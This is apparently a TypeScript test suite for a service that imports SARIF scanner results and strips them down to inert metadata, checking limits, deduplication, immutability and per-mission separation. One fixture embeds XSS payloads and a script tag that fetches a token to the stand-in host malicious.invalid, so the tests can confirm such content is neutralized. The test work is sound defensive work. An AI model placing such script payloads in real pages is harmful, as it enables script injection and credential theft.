import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, it } from "node:test";
import { openDatabase } from "../db/database.js";
import { AuditService } from "./audit-service.js";
import { EvidenceService } from "./evidence-service.js";
import {
  INERT_SARIF_LIMITS,
  INERT_SARIF_PARSER_ID,
  INERT_SARIF_PARSER_VERSION,
  InertImportService
} from "./inert-import-service.js";
import { MissionService } from "./mission-service.js";

const now = new Date("2026-07-19T18:00:00.000Z");

function setup() {
  const database = openDatabase();
  const audit = new AuditService(database);
  const evidence = new EvidenceService(
    database,
    mkdtempSync(join(tmpdir(), "war-room-inert-import-")),
    audit
  );
  const missions = new MissionService(database, audit);
  const mission = missions.createMission("Inert SARIF import lab", now);
  const service = new InertImportService(database, evidence, audit);
  return { database, audit, evidence, missions, mission, service };
}

function sarif(
  results: unknown[],
  options: { toolName?: string; rules?: unknown[]; version?: string } = {}
): string {
  return JSON.stringify({
    version: options.version ?? "2.1.0",
    $schema: "https://json.schemastore.org/sarif-2.1.0.json",
    runs: [
      {
        tool: {
          driver: {
            name: options.toolName ?? "Bounded Scanner",
            informationUri: "https://scanner.invalid/docs",
            rules: options.rules ?? [{ id: "SAFE-001", helpUri: "https://scanner.invalid/rule" }]
          }
        },
        results
      }
    ]
  });
}

function result(
  message: string,
  options: {
    ruleId?: string;
    uri?: string;
    line?: number;
    level?: string;
    extra?: Record<string, unknown>;
  } = {}
): Record<string, unknown> {
  return {
    ruleId: options.ruleId ?? "SAFE-001",
    level: options.level ?? "warning",
    message: { text: message, markdown: `[link](https://malicious.invalid/${message.length})` },
    locations: [
      {
        physicalLocation: {
          artifactLocation: { uri: options.uri ?? "file:///C:/lab/source.ts" },
          region: { startLine: options.line ?? 12, startColumn: 4 }
        }
      }
    ],
    properties: {
      html: "<img src=x onerror=alert(1)>",
      command: "must remain inert",
      ...options.extra
    }
  };
}

describe("inert SARIF import foundation", () => {
  it("retains the exact source artifact while normalizing only inert unverified metadata", () => {
    const { database, audit, evidence, mission, service } = setup();
    const hostile = sarif(
      [
        result(
          "<script>fetch('https://malicious.invalid/collect?token=raw')</script>",
          {
            ruleId: "RULE<script>alert(1)</script>",
            uri: "https://malicious.invalid/open-me",
            extra: { payloadUrl: "https://malicious.invalid/payload.exe" }
          }
        )
      ],
      { toolName: "Scanner<script>alert(1)</script>" }
    );
    const imported = service.importSarif(
      mission.id,
      hostile,
      { operator: "import analyst" },
      now
    );

    assert.equal(imported.parserId, INERT_SARIF_PARSER_ID);
    assert.equal(imported.parserVersion, INERT_SARIF_PARSER_VERSION);
    assert.equal(imported.resultCount, 1);
    assert.equal(imported.candidateCount, 1);
    assert.equal(imported.integrityValid, true);
    assert.equal(evidence.read(imported.sourceArtifactId).toString("utf8"), hostile);
    assert.equal(
      evidence.observationForMission(imported.sourceArtifactId, mission.id).id,
      imported.sourceObservationId
    );

    const candidate = database
      .prepare("SELECT * FROM inert_import_candidates WHERE mission_id = ?")
      .get(mission.id) as {
      fingerprint: string;
      status: string;
      normalized_key_json: string;
    };
    assert.equal(candidate.status, "unverified");
    const observations = service.observationsForCandidate(mission.id, candidate.fingerprint);
    assert.equal(observations.length, 1);
    assert.equal(observations[0]!.integrityValid, true);
    assert.equal(observations[0]!.normalized.verification, "unverified");
    assert.match(observations[0]!.normalized.toolName, /^untrusted-tool-[a-f0-9]{32}$/);
    assert.match(observations[0]!.normalized.ruleId, /^untrusted-rule-[a-f0-9]{32}$/);
    assert.equal(observations[0]!.normalized.location.uriHash?.length, 64);

    const normalizedJson = (
      database
        .prepare("SELECT normalized_json FROM inert_import_observations WHERE import_id = ?")
        .get(imported.id) as { normalized_json: string }
    ).normalized_json;
    const normalizedKeyJson = candidate.normalized_key_json;
    for (const inertOnly of [
      "<script>",
      "malicious.invalid",
      "payload.exe",
      "fetch(",
      "onerror",
      "open-me"
    ]) {
      assert.doesNotMatch(normalizedJson, new RegExp(inertOnly.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i"));
      assert.doesNotMatch(normalizedKeyJson, new RegExp(inertOnly.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i"));
    }
    assert.equal(
      (database.prepare("SELECT COUNT(*) AS count FROM findings").get() as { count: number }).count,
      0
    );

    const importAudit = database
      .prepare(
        "SELECT payload_json FROM audit_events WHERE event_type = 'inert_import.completed' ORDER BY sequence DESC LIMIT 1"
      )
      .get() as { payload_json: string };
    assert.match(importAudit.payload_json, new RegExp(imported.sourceSha256));
    assert.match(importAudit.payload_json, new RegExp(INERT_SARIF_PARSER_ID));
    assert.doesNotMatch(importAudit.payload_json, /malicious\.invalid|<script>|payload\.exe/i);
    assert.equal(audit.verify().valid, true);
    database.close();
  });

  it("deduplicates deterministic candidates across reimports while preserving every observation", () => {
    const { database, evidence, mission, service } = setup();
    const firstSource = sarif([
      result("First scanner narrative", { uri: "file:///C:/lab/reimport.ts", line: 33 })
    ]);
    const first = service.importSarif(
      mission.id,
      firstSource,
      { operator: "import analyst" },
      now
    );
    const fingerprint = (
      database
        .prepare(
          `SELECT candidate.fingerprint
           FROM inert_import_candidates candidate
           WHERE candidate.mission_id = ?`
        )
        .get(mission.id) as { fingerprint: string }
    ).fingerprint;

    const secondSource = sarif([
      result("Changed narrative remains source-only", {
        uri: "file:///C:/lab/reimport.ts",
        line: 33,
        level: "error"
      })
    ]);
    const second = service.importSarif(
      mission.id,
      secondSource,
      { operator: "import analyst", parentImportId: first.id },
      new Date(now.valueOf() + 1_000)
    );

    assert.notEqual(first.sourceArtifactId, second.sourceArtifactId);
    assert.equal(second.parentImportId, first.id);
    assert.deepEqual(service.lineage(second.id).map((item) => item.id), [second.id, first.id]);
    assert.equal(
      (database
        .prepare("SELECT COUNT(*) AS count FROM inert_import_candidates WHERE mission_id = ?")
        .get(mission.id) as { count: number }).count,
      1
    );
    const observations = service.observationsForCandidate(mission.id, fingerprint);
    assert.equal(observations.length, 2);
    assert.equal(new Set(observations.map((item) => item.importId)).size, 2);
    assert.equal(new Set(observations.map((item) => item.candidateId)).size, 1);
    assert.equal(observations.every((item) => item.integrityValid), true);
    assert.equal(observations[0]!.normalized.level, "warning");
    assert.equal(observations[1]!.normalized.level, "error");
    assert.equal(evidence.read(first.sourceArtifactId).toString("utf8"), firstSource);
    assert.equal(evidence.read(second.sourceArtifactId).toString("utf8"), secondSource);
    database.close();
  });

  it("preserves duplicate observations inside one import without duplicating the candidate", () => {
    const { database, mission, service } = setup();
    const source = sarif([
      result("Observation one", { uri: "file:///C:/lab/duplicate.ts", line: 9 }),
      result("Observation two", { uri: "file:///C:/lab/duplicate.ts", line: 9 })
    ]);
    const imported = service.importSarif(
      mission.id,
      source,
      { operator: "import analyst" },
      now
    );
    assert.equal(imported.resultCount, 2);
    assert.equal(imported.candidateCount, 1);
    assert.equal(
      (database
        .prepare("SELECT COUNT(*) AS count FROM inert_import_observations WHERE import_id = ?")
        .get(imported.id) as { count: number }).count,
      2
    );
    assert.equal(
      (database
        .prepare("SELECT COUNT(*) AS count FROM inert_import_candidates WHERE mission_id = ?")
        .get(mission.id) as { count: number }).count,
      1
    );
    database.close();
  });

  it("enforces byte, aggregate result, version, UTF-8 and message bounds before sealing evidence", () => {
    const { database, mission, service } = setup();
    assert.throws(
      () =>
        service.importSarif(
          mission.id,
          Buffer.alloc(INERT_SARIF_LIMITS.maxBytes + 1, 0x20),
          { operator: "import analyst" },
          now
        ),
      /SARIF_BYTE_LIMIT_EXCEEDED/
    );
    assert.throws(
      () =>
        service.importSarif(
          mission.id,
          sarif(Array.from({ length: INERT_SARIF_LIMITS.maxResults + 1 }, (_, index) =>
            result(`Result ${index}`)
          )),
          { operator: "import analyst" },
          now
        ),
      /SARIF_RESULT_LIMIT_EXCEEDED/
    );
    assert.throws(
      () =>
        service.importSarif(
          mission.id,
          sarif([result("Wrong version")], { version: "2.0.0" }),
          { operator: "import analyst" },
          now
        ),
      /SARIF_VERSION_UNSUPPORTED/
    );
    assert.throws(
      () =>
        service.importSarif(
          mission.id,
          Uint8Array.from([0xc3, 0x28]),
          { operator: "import analyst" },
          now
        ),
      /SARIF_UTF8_INVALID/
    );
    assert.throws(
      () =>
        service.importSarif(
          mission.id,
          sarif([result("x".repeat(INERT_SARIF_LIMITS.maxMessageCharacters + 1))]),
          { operator: "import analyst" },
          now
        ),
      /SARIF_MESSAGE_INVALID/
    );
    assert.equal(
      (database.prepare("SELECT COUNT(*) AS count FROM artifacts").get() as { count: number }).count,
      0
    );
    database.close();
  });

  it("rejects cross-mission reimport lineage and keeps mission deduplication isolated", () => {
    const { database, evidence, missions, mission, service } = setup();
    const source = sarif([result("Mission-bound candidate")]);
    const first = service.importSarif(
      mission.id,
      source,
      { operator: "import analyst" },
      now
    );
    const otherMission = missions.createMission(
      "Other inert import mission",
      new Date(now.valueOf() + 1_000)
    );
    assert.throws(
      () =>
        service.importSarif(
          otherMission.id,
          source,
          { operator: "import analyst", parentImportId: first.id },
          new Date(now.valueOf() + 2_000)
        ),
      /INERT_IMPORT_PARENT_MISSION_MISMATCH/
    );
    assert.equal(evidence.observations(first.sourceArtifactId, otherMission.id).length, 0);

    const independent = service.importSarif(
      otherMission.id,
      source,
      { operator: "import analyst" },
      new Date(now.valueOf() + 3_000)
    );
    assert.equal(independent.sourceArtifactId, first.sourceArtifactId);
    assert.notEqual(independent.sourceObservationId, first.sourceObservationId);
    const candidates = database
      .prepare(
        "SELECT id, mission_id, fingerprint FROM inert_import_candidates ORDER BY mission_id"
      )
      .all() as unknown as Array<{ id: string; mission_id: string; fingerprint: string }>;
    assert.equal(candidates.length, 2);
    assert.notEqual(candidates[0]!.id, candidates[1]!.id);
    assert.equal(candidates[0]!.fingerprint, candidates[1]!.fingerprint);
    assert.equal(new Set(candidates.map((candidate) => candidate.mission_id)).size, 2);
    database.close();
  });

  it("keeps imports, candidates and observations immutable", () => {
    const { database, mission, service } = setup();
    const imported = service.importSarif(
      mission.id,
      sarif([result("Immutable import")]),
      { operator: "import analyst" },
      now
    );
    assert.throws(
      () =>
        database
          .prepare("UPDATE inert_imports SET result_count = 0 WHERE id = ?")
          .run(imported.id),
      /INERT_IMPORT_IMMUTABLE/
    );
    assert.throws(
      () =>
        database
          .prepare(
            "UPDATE inert_import_candidates SET status = 'unverified' WHERE mission_id = ?"
          )
          .run(mission.id),
      /INERT_IMPORT_CANDIDATE_IMMUTABLE/
    );
    assert.throws(
      () =>
        database
          .prepare(
            "UPDATE inert_import_observations SET normalized_hash = ? WHERE import_id = ?"
          )
          .run("0".repeat(64), imported.id),
      /INERT_IMPORT_OBSERVATION_IMMUTABLE/
    );
    database.close();
  });
});
